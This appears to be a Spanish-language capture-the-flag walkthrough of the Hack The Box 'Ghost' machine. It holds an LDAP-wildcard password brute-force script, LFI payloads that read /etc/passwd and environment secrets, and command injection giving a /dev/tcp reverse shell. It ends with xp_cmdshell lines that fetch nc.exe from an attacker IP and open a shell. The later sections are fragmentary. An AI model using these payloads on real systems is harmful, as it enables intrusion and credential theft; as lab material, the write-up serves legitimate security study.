#windows  #tecnicas #Insane 
### Ping

```python
ping -c 1 10.10.11.24
PING 10.10.11.24 (10.10.11.24) 56(84) bytes of data.
64 bytes from 10.10.11.24: icmp_seq=1 ttl=127 time=156 ms

--- 10.10.11.24 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 156.384/156.384/156.384/0.000 ms
```

### TTL = 127 Windows

### nmap

```python
# Nmap 7.94SVN scan initiated Thu Jul 18 17:18:48 2024 as: nmap -p- -open -sCV --min-rate 5000 -n -Pn -oN Scan 10.10.11.24
Nmap scan report for 10.10.11.24
Host is up (0.16s latency).
Not shown: 65508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-18 21:19:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ms-sql-ntlm-info: 
|   10.10.11.24:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2024-07-18T21:21:01+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-18T13:28:51
|_Not valid after:  2054-07-18T13:28:51
| ms-sql-info: 
|   10.10.11.24:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2024-06-16T15:49:55
|_Not valid after:  2024-12-16T15:49:55
|_ssl-date: 2024-07-18T21:21:01+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-18T21:20:23+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Ghost
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-generator: Ghost 5.78
|_http-server-header: nginx/1.18.0 (Ubuntu)
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
| tls-nextprotoneg: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
50221/tcp open  msrpc         Microsoft Windows RPC
60539/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60752/tcp open  msrpc         Microsoft Windows RPC
60785/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-07-18T21:20:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 18 17:21:05 2024 -- 1 IP address (1 host up) scanned in 137.62 seconds
```

### Enumeración del puerto 8008 (http)
Ghost CMS es un sistema de gestión de contenidos (CMS) moderno y de código abierto diseñado principalmente para blogs (el resultado de Nmap indica que este es el 5.78 versión)

![[Pasted image 20240718174434.png]]

```python

1)Panel de administrador:  
  
/ghost/ - La página de inicio de sesión de administrador.  
/ghost/#/signin - Enlace directo a la página de inicio de sesión.  
  
2)Contenido y archivos estáticos:  
  
/content/images/ - Directorio predeterminado para imágenes cargadas.  
/content/themes/ - Directorio de temas instalados.  
/content/ - Directorio base de contenidos, temas e imágenes.  
  
3)Puntos finales de API:  
  
/ghost/api/v3/ - Punto final API para Ghost CMS v3.  
/ghost/api/v4/ - Punto final API para Ghost CMS v4.  
/ghost/api/v4/content/ - Punto final de API de contenido público.  
/ghost/api/v4/admin/ - Punto final de API de administración.  
  
4)Archivos de configuración y respaldo:  
  
/config.production.json - Archivo de configuración para el entorno de producción (no debe ser de acceso público).  
/config.development.json - Archivo de configuración del entorno de desarrollo.  
/ghost/api/v3/admin/db/ - Punto final de base de datos potencialmente accesible para operaciones de copia de seguridad y restauración.
```

`<script src="/assets/built/source.js?v=f335afc3d4"></script>`
Al inspeccionar su código fuente, podemos descubrir un punto final de JavaScript:
![[Pasted image 20240718174936.png]]

### Fuzzing con wfuzz
haciendo un Fuzzing de directorios no podemos encontrar nada muy importante
![[Pasted image 20240718175430.png]]

### Fuzzing con ffuf
encontramos un subdominio así que vamos a enumerarlo
![[Pasted image 20240718191759.png]]

### intranet
hemos conseguido un panel de login. aquí empieza lo bueno 
![[Pasted image 20240718191926.png]]

### Ghost Core
investigando en internet algunos foros de la comunidad del `CMS Ghost` nos hacen referencia a un subdominio llamado `core`
![[Pasted image 20240718192311.png]]

`federeacion`
al hacer clic en el botón nos redirige a otro subdominio así que lo vamos a agregar 
![[Pasted image 20240718192530.png]]

`login`
volvemos al inicio e intentamos iniciar sesión para interceptar con Burpsuite 
![[Pasted image 20240718193135.png]]

### Burpsuite
después de varios intentos identificamos que el identificador `*` tanto en el username como en el secret nos permite obtener un token de sesión 
![[Pasted image 20240718193318.png]]

### Intranet
iniciamos sesión como el usuario `Kathryn.holland`
![[Pasted image 20240718193515.png]]

`Users`
podemos enumerar el listado de usuarios con los roles
![[Pasted image 20240718193754.png]]

### Kerbrute
usando la lista de usuarios hemos intentado hacer una enumeración con kerbrute pero no obtenemos nada. sin embargo investigando podemos identificar que el usuario `gitea_temp_principal@ghost.htb` parece ser vulnerable a ciertos ataques.
![[Pasted image 20240718194729.png]]

### script

```python
import string
import requests
from pwn import *

url = 'http://intranet.ghost.htb:8008/login'
bar = log.progress("Bruteforcing password")

headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}

# Formdata
files = {
    '1_ldap-username': (None, 'gitea_temp_principal'),
    '1_ldap-secret': (None, 's*'),
    '0': (None, '[{},"$K1"]')
}

password = ""
while True:
    for char in string.ascii_lowercase + string.digits:
        bar.status(f"trying {char} now for the next character...")
        files = {
            '1_ldap-username': (None, 'gitea_temp_principal'),
            '1_ldap-secret': (None, f'{password}{char}*'),
            '0': (None, '[{},"$K1"]')
        }
        res = requests.post(url, headers=headers, files=files)
        if res.status_code == 303:
            password += char
            print(f"The current password is {password} + *")
            break
    else:
        break
    
bar.success(f"The final password is {password}")
```

de esta manera logramos conseguir las cerdenciales del usuario `_gitea_temp_principal_` 
![[Pasted image 20240718195411.png]]

`gitea.ghost.htb:8008`
iniciamos sesión con las credenciales que hemos encontrado 
![[Pasted image 20240718200032.png]]

![[Pasted image 20240718200213.png]]

### Recopilación

```python
El blog utiliza Ghost CMS, que se ejecuta dentro de un contenedor Docker.  

El blog se está integrando con una intranet y algunas funciones requieren una clave API denominada DEV_INTRANET_KEY, almacenado como 
una variable de entorno.  

Esta clave se comparte entre la intranet y el blog, lo que sugiere que si podemos obtener esta clave, podría proporcionar acceso a las funcionalidades de la intranet.  

Se proporciona la clave API pública para Ghost: a5af628828958c976a3b6cc81a.
```

`Además, menciona que un archivo específico, posts-public.js, ha sido modificado para agregar nuevas funciones. Al revisar el código fuente, podemos identificar una vulnerabilidad de inclusión de archivos locales (LFI) para el extra parámetro:`

```python
async query(frame) {
            const options = {
                ...frame.options,
                mongoTransformer: rejectPrivateFieldsTransformer
            };
            const posts = await postsService.browsePosts(options);
            const extra = frame.original.query?.extra;
            if (extra) {
                const fs = require("fs");
                if (fs.existsSync(extra)) {
                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
                    posts.meta.extra = { [extra]: fileContent };
                }
            }
            return posts;
        }
```


`El extra El parámetro no está desinfectado adecuadamente, por lo que podemos recorrer directorios y leer archivos fuera del directorio deseado ( /var/lib/ghost/extra/), con una carga útil como ../../../etc/passwd`  

### LFI
`Por lo tanto, podemos acceder al punto final de publicación para realizar la prueba. Según la documentación oficial de Ghost , que indica que nuestro camino transversal podría ser`

```python
curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../etc/passwd&key=API_KEY"  
```

`Podemos usar la clave API pública proporcionada anteriormente en el archivo Léame, probar cuánto ../ Necesitamos identificar la posición del directorio del sistema de archivos`

```python
curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../etc/passwd&key=a5af628828958c976a3b6cc81a"
```

![[Pasted image 20240718202009.png]]


`Una vez que el POC funcione, ahora podremos extraer la información que nos interesa. Aunque externamente es una máquina con Windows, ahora sabemos que ejecuta un contenedor Linux como servidor del Blog. Dado que menciona "Clave API denominada DEV_INTRANET_KEY almacenado como una variable de entorno ", luego podemos verificar el /proc/self/environ ruta para el sistema de archivos`

```python
curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../proc/self/environ&key=a5af628828958c976a3b6cc81a" | jq
```

![[Pasted image 20240718202605.png]]

![[Pasted image 20240718202805.png]]

`tenemos el DEV_INTRANET_KEY=!@yqr!▒▒▒▒▒▒▒▒, que se utilizará para algunas funciones de la intranet, como el escaneo, como se mencionó.`

`Eche un vistazo a otro repositorio de Gitea, el archivo Léame nos dice que la API de desarrollo en http://intranet.ghost.htb/api-dev estará expuesta hasta que finalice el desarrollo, a las que se agregan algunas características nuevas para integrar el blog y el intranet`  
  
`Como ya se mencionó mucho, hay una función de escaneo en desarrollo, por lo que podemos revisar los códigos en la ruta intranet/backend/src/api/dev/scan.rs:` 

```python
use std::process::Command;

use rocket::serde::json::Json;
use rocket::serde::Serialize;
use serde::Deserialize;

use crate::api::dev::DevGuard;

#[derive(Deserialize)]
pub struct ScanRequest {
    url: String,
}

#[derive(Serialize)]
pub struct ScanResponse {
    is_safe: bool,
    // remove the following once the route is stable
    temp_command_success: bool,
    temp_command_stdout: String,
    temp_command_stderr: String,
}

// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();

    match result {
        Ok(output) => {
            Json(ScanResponse {
                is_safe: true,
                temp_command_success: true,
                temp_command_stdout: String::from_utf8(output.stdout).unwrap_or("".to_string()),
                temp_command_stderr: String::from_utf8(output.stderr).unwrap_or("".to_string()),
            })
        }
        Err(_) => Json(ScanResponse {
            is_safe: true,
            temp_command_success: false,
            temp_command_stdout: "".to_string(),
            temp_command_stderr: "".to_string(),
        })
    }
}
```

```python
> El ScanRequest struct representa la solicitud JSON entrante, que incluye un url campo.  

> El ScanResponse struct representa la respuesta JSON, incluidos los campos para el resultado de la verificación de seguridad y el resultado de la ejecución del comando.  

> El key extrae valor X-DEV-INTRANET-KEY desde el encabezado de la solicitud, luego lo compara con la variable de entorno en la máquina de destino, que recuperamos en el último paso.  

> El scan La función construye un comando de shell usando bash -c correr intranet_url_check con la URL proporcionada.  

> El comando está construido con format!("intranet_url_check {}", data.url), que incorpora directamente el url parámetro en el comando de shell sin desinfección.
```

Por lo tanto, si el urlEl parámetro contiene metacaracteres de shell, puede inyectar comandos arbitrarios. Podemos probar la vulnerabilidad enviando una solicitud POST al punto final mencionado en el archivo Readme:

```python
curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"https://4xura.com; whoami"}' | jq
```

![[Pasted image 20240718203301.png]]

Parece que tenemos un usuario root web en el back-end. Ahora podemos preparar nuestra carga útil de reverse shell para la máquina contenedora Linux.  
  
Sin embargo, parece que la máquina no tiene el comando bash, por lo que intentaremos con sh en cambio

```python
curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"https://4xura.com; sh -i >& /dev/tcp/10.10.14.73/9001 0>&1"}' | jq
```

efectivamente podemos obtener una reverse shell
![[Pasted image 20240718203643.png]]


`Como usuario root dentro del contenedor, podemos leer o escribir cualquier archivo. Enumere los archivos dentro de él, hay un docker.entrypoint,sh se ubica en la carpeta raíz, que siempre indica cómo se estaba configurando el contenedor`
![[Pasted image 20240718204215.png]]

### ssh
Establece configuraciones SSH, intenta establecer una conexión SSH y luego ejecuta el programa de intranet, con las credenciales del usuario florence.ramirez Por lo tanto, podemos pasar a este usuario. pero no tenemos nada de importancia
![[Pasted image 20240718204732.png]]

### crackmapexec
validamos las credenciales y efectivamente son las correctas
![[Pasted image 20240718205230.png]]

### dnschef

![[Pasted image 20240718210256.png]]


----------------------------------------------------------------
-----------------------------------------------------------
--------------------------------------------------------------

### evil-winrm
obtenemos la conexión
![[Pasted image 20240718213329.png]]

### Info

![[Pasted image 20240718214032.png]]

### nxc

```python
Get-ADGroup -Identity 'Key Admins' -Properties *:
```

![[Pasted image 20240718213845.png]]

xp_cmdshell "echo IWR http://10.10.16.2/nc.exe -Outfile %TEMP%\nc.exe | powershell -noprofile"

xp_cmdshell "%TEMP%\nc.exe 10.10.16.2 4444 -e powershell.exe"